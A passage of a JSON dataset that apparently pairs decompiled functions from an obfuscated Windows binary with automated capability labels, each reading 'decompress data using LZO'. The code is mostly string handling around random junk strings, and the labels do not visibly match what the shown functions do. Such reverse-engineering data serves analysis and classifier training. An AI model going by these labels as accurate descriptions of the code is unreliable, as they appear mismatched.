        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00405975(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    uint32_t in_stack_00000018;\n    uint32_t in_stack_ffffff20;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x414880;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 8;\n    pcStack160 = \"swwyhljyqzjjevanbmuhjklddrzayslqsdzkqlzzamjybsrjwakpqmilejasgapfruxpkrxqznj\";\n    auStack168[0] = 0x4b;\n    fcn.00402f72();\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x15, iStack108, \"kwluvloxvsxasaonaenhf\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x35, iStack60, \"chuojnwpthwplmqkjqckavyfkaopentktglfdfndzubtqjxxsdldc\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x4b, uStack84, \"swwyhljyqzjjevanbmuhjklddrzayslqsdzkqlzzamjybsrjwakpqmilejasgapfruxpkrxqznj\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xd;\n    fcn.00402f72(0x4b, uStack36, \"swwyhljyqzjjevanbmuhjklddrzayslqsdzkqlzzamjybsrjwakpqmilejasgapfruxpkrxqznj\");\n    if (uStack64 < 0x10) {\ncode_r0x0040de3e:\n        if (0xf < uStack40) {\n            in_stack_ffffff20 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff20) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0040e086;\n                in_stack_ffffff20 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x4b, in_stack_ffffff20 & 0xffffff00 | uStack84 & 0xff, \n                     \"swwyhljyqzjjevanbmuhjklddrzayslqsdzkqlzzamjybsrjwakpqmilejasgapfruxpkrxqznj\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xc;\n        fcn.00402f72(0x4b, uStack36, \"swwyhljyqzjjevanbmuhjklddrzayslqsdzkqlzzamjybsrjwakpqmilejasgapfruxpkrxqznj\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x0040e092;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0040e09e;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0040e0aa;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x0040e0b6;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x0040e0c2;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x0040e0ce;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x4ea1e4;\n    }\n    in_stack_ffffff20 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff20 < 0x1000) {\ncode_r0x0040de32:\n        fcn.00401a32(uVar1);\n        goto code_r0x0040de3e;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff20 = uStack64 + 0x24;\n        goto code_r0x0040de32;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0040e086:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0040e092:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0040e09e:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0040e0aa:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0040e0b6:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0040e0c2:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0040e0ce:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 2090
    },
    "00405ac9": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00405ac9(uint param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_00000020;\n    uint auStack96 [2];\n    char *pcStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack96;\n    uStack24 = 0x44c270;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    pcStack88 = \"ovymixsejratimpszukicrmtfzwmuncxyslgjskjxiwewxkuaxdhgipijfcidutqkrrv\";\n    auStack96[0] = 0x44;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x2f, uStack36, \"gbjwuacajctfmtkxwkmezjkkgtibnwhhgxsakvoumjlppdn\");\n    if (uStack40 < 0x10) {\ncode_r0x00426359:\n        if (0xf < uStack64) {\n            iVar1 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1))\n            goto code_r0x004263ef;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar1 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar1 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar1))\n            goto code_r0x004263fb;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x54204c;\n    }\n    iVar1 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(iStack60 + -4),  (iStack60 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x00426359;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004263ef:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004263fb:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 795
    },
    "00405e5c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405e5c(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    uint32_t in_stack_ffffff2c;\n    uint32_t in_stack_ffffff44;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x44c100;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 9;\n    pcStack136 = \"fymwndkofzjubyebvlitlglwqynlwwdffzhcxnkaezwcxoexhhfroylalchxpucgiozo\";\n    auStack144[0] = 0x44;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x48, iStack60, \"qntdktvpcjelfbylrrzixrfgxiwcmfyggezcfhwltdygsgikzsiphtweouboypktghzuuncs\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x48, uStack84, \"qntdktvpcjelfbylrrzixrfgxiwcmfyggezcfhwltdygsgikzsiphtweouboypktghzuuncs\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xe;\n    fcn.00402f72(0x48, uStack36, \"qntdktvpcjelfbylrrzixrfgxiwcmfyggezcfhwltdygsgikzsiphtweouboypktghzuuncs\");\n    if (uStack64 < 0x10) {\ncode_r0x0042182e:\n        if (0xf < uStack40) {\n            in_stack_ffffff44 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff44) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x00421b26;\n                in_stack_ffffff44 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x48, in_stack_ffffff44 & 0xffffff00 | uStack84 & 0xff, \n                     \"qntdktvpcjelfbylrrzixrfgxiwcmfyggezcfhwltdygsgikzsiphtweouboypktghzuuncs\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xd;\n        fcn.00402f72(0x48, uStack36, \"qntdktvpcjelfbylrrzixrfgxiwcmfyggezcfhwltdygsgikzsiphtweouboypktghzuuncs\");\n        if (0xf < uStack64) {\n            in_stack_ffffff2c = uStack64 + 1;\n            uVar1 = uStack84;\n            if (0xfff < in_stack_ffffff2c) {\n                uVar1 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar1) goto code_r0x00421b32;\n                in_stack_ffffff2c = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff2c = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff2c) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x00421b3e;\n                in_stack_ffffff2c = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x48, in_stack_ffffff2c & 0xffffff00 | uStack84 & 0xff, \n                     \"qntdktvpcjelfbylrrzixrfgxiwcmfyggezcfhwltdygsgikzsiphtweouboypktghzuuncs\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xc;\n        fcn.00402f72(0x48, uStack36, \"qntdktvpcjelfbylrrzixrfgxiwcmfyggezcfhwltdygsgikzsiphtweouboypktghzuuncs\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x00421b4a;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00421b56;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x00421b62;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00421b6e;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x00421b7a;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    in_stack_ffffff44 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff44 < 0x1000) {\ncode_r0x00421822:\n        fcn.00401a32(uVar1);\n        goto code_r0x0042182e;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff44 = uStack64 + 0x24;\n        goto code_r0x00421822;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00421b26:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00421b32:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00421b3e:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00421b4a:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00421b56:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00421b62:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00421b6e:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x00421b7a:\n    uStack20 = 8;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 2376
    },
    "00405ed4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.00405ed4(uint param_1, uint param_2, uint param_3)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint32_t uVar2;\n    int32_t iStack64;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    code **ppcStack40;\n    uint8_t uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffffc0;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e360;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uStack48 = 0;\n    uStack44 = 0xf;\n    iStack64 = 0;\n    uVar2 = 0x418d84;\n    uVar1 = fcn.004061db(param_3);\n    if (uVar1 < 0x10) {\n        uStack48 = uVar1;\n        fcn.0040576d(&stack0xffffffc0, param_3, uVar1);\n        (&stack0xffffffc0)[uVar1] = 0;\n    }\n    else {\n        fcn.00402f72(uVar1, uVar2 & 0xffffff00 | uStack36, param_3);\n    }\n    uStack20 = 1;\n    fcn.00402af4(param_1, param_2, &stack0xffffffc0);\n    if (0xf < uStack44) {\n        arg_8h = iStack64;\n        if ((0xfff < uStack44 + 1) && (arg_8h = *(iStack64 + -4),  0x1f < (iStack64 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.00403a76();\n            return;\n        }\n        fcn.00401a32(arg_8h);\n    }\n    *ppcStack40 = vtable.std::system_error.0;\n    *in_FS_OFFSET = iStack28;\n    return;\n}\n",
        "token_count": 519
    },
    "00405f15": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00405f15(uint *param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    int32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    int32_t in_stack_00000044;\n    uint32_t in_stack_00000058;\n    uint32_t in_stack_ffffff64;\n    uint auStack124 [2];\n    char *pcStack116;\n    int32_t iStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    uint *puStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack124;\n    uStack24 = 0x44c520;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack88 = param_1;\n    uStack96 = 0;\n    uStack92 = 0xf;\n    iStack112 = 0;\n    uStack20 = 8;\n    pcStack116 = \"hxugxqfieazobenqgozynfqeuhmuzgmwkqznbwypbifahrppsaermsoqmzrzuhblqkrvuxqfshyycnyldwej\";\n    auStack124[0] = 0x54;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x54, uStack84, \"hxugxqfieazobenqgozynfqeuhmuzgmwkqznbwypbifahrppsaermsoqmzrzuhblqkrvuxqfshyycnyldwej\")\n    ;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x54, uStack36, \"hxugxqfieazobenqgozynfqeuhmuzgmwkqznbwypbifahrppsaermsoqmzrzuhblqkrvuxqfshyycnyldwej\")\n    ;\n    if (uStack64 < 0x10) {\ncode_r0x0042f6c0:\n        if (0xf < uStack40) {\n            in_stack_ffffff64 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff64) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x0042f94b;\n                in_stack_ffffff64 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x54, in_stack_ffffff64 & 0xffffff00 | uStack84 & 0xff, \n                     \"hxugxqfieazobenqgozynfqeuhmuzgmwkqznbwypbifahrppsaermsoqmzrzuhblqkrvuxqfshyycnyldwej\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x54, uStack36, \n                     \"hxugxqfieazobenqgozynfqeuhmuzgmwkqznbwypbifahrppsaermsoqmzrzuhblqkrvuxqfshyycnyldwej\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x0042f957;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x0042f963;\n            fcn.00401a32(iVar3);\n        }\n        *puStack88 = 0;\n        puStack88[5] = 0xf;\n        puStack88[4] = 7;\n        *puStack88 = 0x666c736f;\n        *(puStack88 + 3) = 0x6f787866;\n        *(puStack88 + 7) = 0;\n        if (0xf < uStack92) {\n            iVar3 = iStack112;\n            if ((0xfff < uStack92 + 1) && (iVar3 = *(iStack112 + -4),  0x1f < (iStack112 + -4) - iVar3))\n            goto code_r0x0042f96f;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000028) {\n            iVar3 = in_stack_00000014;\n            if ((0xfff < in_stack_00000028 + 1) &&\n               (iVar3 = *(in_stack_00000014 + -4),  0x1f < (in_stack_00000014 + -4) - iVar3)) goto code_r0x0042f97b;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000040) {\n            iVar3 = in_stack_0000002c;\n            if ((0xfff < in_stack_00000040 + 1) &&\n               (iVar3 = *(in_stack_0000002c + -4),  0x1f < (in_stack_0000002c + -4) - iVar3)) goto code_r0x0042f987;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000058) {\n            iVar3 = in_stack_00000044;\n            if ((0xfff < in_stack_00000058 + 1) &&\n               (iVar3 = *(in_stack_00000044 + -4),  0x1f < (in_stack_00000044 + -4) - iVar3)) goto code_r0x0042f993;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    in_stack_ffffff64 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff64 < 0x1000) {\ncode_r0x0042f6b4:\n        fcn.00401a32(uVar2);\n        goto code_r0x0042f6c0;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff64 = uStack64 + 0x24;\n        goto code_r0x0042f6b4;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042f94b:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042f957:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0042f963:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042f96f:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0042f97b:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0042f987:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0042f993:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 2116
    },
    "00406064": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00406064(void)\n\n{\n    uchar *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t unaff_EDI;\n    uint32_t *in_FS_OFFSET;\n    uint32_t in_stack_00000010;\n    uint in_stack_00000020;\n    uint32_t in_stack_00000024;\n    uchar *in_stack_00000044;\n    uint32_t in_stack_00000058;\n    uint uStack196;\n    uchar uStack192;\n    char *pcStack188;\n    int32_t iStack184;\n    uint uStack168;\n    uint32_t uStack164;\n    int32_t iStack160;\n    uint uStack144;\n    uint32_t uStack140;\n    uchar uStack136;\n    uchar *puStack132;\n    uint32_t uStack128;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uchar *puStack112;\n    uchar *puStack88;\n    uint32_t uStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint32_t uStack68;\n    uint *puStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uchar *puStack32;\n    uint32_t uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffffe0;\n    puStack72 = &stack0x00000004;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c090;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uStack68 = unaff_EDI;\n    puVar1 = &stack0xffffffe0;\n    if (in_stack_00000024 < 0x10) {\ncode_r0x004205b4:\n        puStack32 = puVar1;\n        in_stack_00000020 = 0;\n        in_stack_00000024 = 0xf;\n        in_stack_00000010 = in_stack_00000010 & 0xffffff00;\n        if (in_stack_00000058 < 0x10) {\ncode_r0x004205fa:\n            *in_FS_OFFSET = uStack28;\n            return 0xe7f1;\n        }\n        puStack72 = in_stack_00000044;\n        if ((in_stack_00000058 + 1 < 0x1000) ||\n           (puStack72 = *(in_stack_00000044 + -4),  in_stack_00000044 + (-4 - puStack72) < 0x20)) {\n            uStack44 = 0x4205f7;\n            fcn.00401a32(puStack72);\n            goto code_r0x004205fa;\n        }\n    }\n    else {\n        uStack68 = in_stack_00000010;\n        if ((in_stack_00000024 + 1 < 0x1000) ||\n           (uStack68 = *(in_stack_00000010 - 4),  unaff_EDI = uStack68,  (in_stack_00000010 - 4) - uStack68 < 0x20)) {\n            uStack44 = 0x4205b1;\n            puStack32 = &stack0xffffffe0;\n            fcn.00401a32(uStack68);\n            uStack68 = unaff_EDI;\n            puVar1 = puStack32;\n            goto code_r0x004205b4;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    puStack48 = 0x42063c;\n    fcn.004052d1();\n    puStack48 = &stack0x00000008;\n    fcn.004052d1();\n    puStack88 = &stack0xffffffa8;\n    puStack116 = &stack0xffffffcc;\n    uStack76 = 0xffffffff;\n    uStack80 = 0x44c0a0;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack52[5] = 0xf;\n    puStack52[4] = 4;\n    *puStack52 = 0x75727972;\n    *(puStack52 + 1) = 0;\n    if (uStack28 < 0x10) {\ncode_r0x004206cf:\n        *in_FS_OFFSET = uStack84;\n        return puStack52;\n    }\n    puStack112 = puStack48;\n    if ((uStack28 + 1 < 0x1000) || (puStack112 = *(puStack48 + -4),  puStack48 + (-4 - puStack112) < 0x20)) {\n        puStack88 = &stack0xffffffa8;\n        fcn.00401a32(puStack112);\n        goto code_r0x004206cf;\n    }\n    uStack76 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack132 = &stack0xffffff3c;\n    uStack120 = 0xffffffff;\n    uStack124 = 0x44c0b0;\n    uStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    uStack168 = 0;\n    uStack164 = 0xf;\n    iStack184 = 0;\n    uStack192 = iStack160;\n    pcStack188 = \"lfwiuydmcppucipbqskffatxjxkaxmqlixvu\";\n    uStack196 = 0x24;\n    fcn.00402f72();\n    uStack144 = 0;\n    uStack140 = 0xf;\n    iStack160 = 0;\n    uStack120 = 2;\n    fcn.00402f72(0x56, uStack136, \n                 \"zjtitmbxfqfbcnfjrzqbbxzazlupxaqtirpxypqstzbabvahxcqjxcosyabocaysnlrzxtkzsrfetxsuxanprr\");\n    if (0xf < uStack140) {\n        iVar3 = iStack160;\n        if ((0xfff < uStack140 + 1) && (iVar3 = *(iStack160 + -4),  0x1f < (iStack160 + -4) - iVar3)) {\n            uStack120 = 0;\n            fcn.004047f5();\n            goto code_r0x00420848;\n        }\n        fcn.00401a32(iVar3);\n    }\n    if (0xf < uStack164) {\n        iVar3 = iStack184;\n        if ((0xfff < uStack164 + 1) && (iVar3 = *(iStack184 + -4),  0x1f < (iStack184 + -4) - iVar3)) {\ncode_r0x00420848:\n            uStack120 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            puVar2 = fcn.00403a76();\n            return puVar2;\n        }\n        fcn.00401a32(iVar3);\n    }\n    *in_FS_OFFSET = uStack128;\n    return 0xa400;\n}\n",
        "token_count": 1657
    },
    "00406087": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
